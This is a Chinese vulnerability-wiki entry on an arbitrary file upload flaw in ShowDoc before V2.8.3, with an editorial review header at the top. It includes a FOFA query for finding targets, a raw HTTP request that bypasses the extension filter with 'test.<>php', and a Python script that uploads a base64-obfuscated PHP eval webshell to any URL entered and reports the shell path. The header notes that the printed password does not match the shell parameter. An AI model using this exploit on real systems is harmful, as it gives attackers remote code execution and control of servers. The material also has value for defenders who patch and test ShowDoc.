---
version: "ShowDoc < V2.8.3"
source: "Threekiii/Vulnerability-Wiki"
product: "ShowDoc<2.8.3"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "ShowDoc-PageController.class.php-任意文件上传漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：uploadImg入口<>过滤顺序、上传PHP可执行；PHP旧裸常量test"
side_effects: "未执行；本文需注意的操作影响：与404同扩展原语但不同入口与完整度，不直接同文删除"
source_status: "unknown"
id: "vw-0b29c2af1c3b8650156a9313"
entity_id: "ve-0b29c2af1c3b8650156a9313"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：uploadImg入口&lt;&gt;过滤顺序、上传PHP可执行；PHP旧裸常量test

- **事实待核（1）**：base64内一句话使用POST\[test\]，打印密码peiqi明显错配。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **结论使用边界（2）**：结果包含test_test且200也可能是源代码明文返回，执行判据需避免纯源码回显。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **证据待核（3）**：返回url为相对路径时直接requests.get会失败；缺补丁链接，404PR/接口应对照。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **操作与副作用边界（4）**：与404同扩展原语但不同入口与完整度，不直接同文删除。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# ShowDoc PageController.class.php 任意文件上传漏洞

## 漏洞描述

ShowDoc 存在任意文件上传漏洞，攻击者通过构造特殊的数据包可以上传恶意文件控制服务器

## 漏洞影响

```
ShowDoc < V2.8.3
```

## 网络测绘

```
app="ShowDoc"
```

## 漏洞复现

网站首页如下

![](./.resource/ShowDoc-PageController.class.php-任意文件上传漏洞/media/202202101919494.png)


构造如下数据包上传php文件


```plain
POST /index.php?s=/home/page/uploadImg HTTP/1.1
Host: xxx.xxx.xxx.xxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
Content-Length: 239
Content-Type: multipart/form-data; boundary=--------------------------921378126371623762173617
Accept-Encoding: gzip

----------------------------921378126371623762173617
Content-Disposition: form-data; name="editormd-image-file"; filename="test.<>php"
Content-Type: text/plain

<?php phpinfo();?>
----------------------------921378126371623762173617--
```


![](./.resource/ShowDoc-PageController.class.php-任意文件上传漏洞/media/202202101919970.png)


访问回显的路径


![](./.resource/ShowDoc-PageController.class.php-任意文件上传漏洞/media/202202101919065.png)


## 漏洞POC

```python
import requests
import sys
import random
import base64
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mTitle: ShowDoc 任意文件上传漏洞                                       \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    vuln_url = target_url + "/index.php?s=/home/page/uploadImg"
    headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)",
            "Content-Type": "multipart/form-data; boundary=--------------------------921378126371623762173617"
    }
    data = base64.b64decode("LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTkyMTM3ODEyNjM3MTYyMzc2MjE3MzYxNwpDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9ImVkaXRvcm1kLWltYWdlLWZpbGUiOyBmaWxlbmFtZT0idGVzdC48PnBocCIKQ29udGVudC1UeXBlOiB0ZXh0L3BsYWluCgo8P3BocCBlY2hvICd0ZXN0X3Rlc3QnO0BldmFsKCRfUE9TVFt0ZXN0XSk/PgotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tOTIxMzc4MTI2MzcxNjIzNzYyMTczNjE3LS0=")
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5)
        if "success" in response.text and response.status_code == 200:
            webshell_url = re.findall(r'"url":"(.*?)"', response.text)[0]
            webshell_url = webshell_url.replace('\\','')
            response = requests.get(url=webshell_url, headers=headers,verify=False, timeout=5)
            if "test_test" in response.text and response.status_code == 200:
                print("\033[32m[o] 目标 {}存在漏洞 ,成功上传木马 \n[o] 路径为 {}\033[0m".format(target_url, webshell_url))
                print("\033[32m[o] 密码为: peiqi \033[0m")
            else:
                print("\033[31m[x] 请求失败 \033[0m")
                sys.exit(0)
        else:
            print("\033[31m[x] 上传失败 \033[0m")
    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)


if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl >>> \033[0m"))
    POC_1(target_url)
```


---

> 来源：Threekiii/Vulnerability-Wiki（https://github.com/Threekiii/Vulnerability-Wiki）
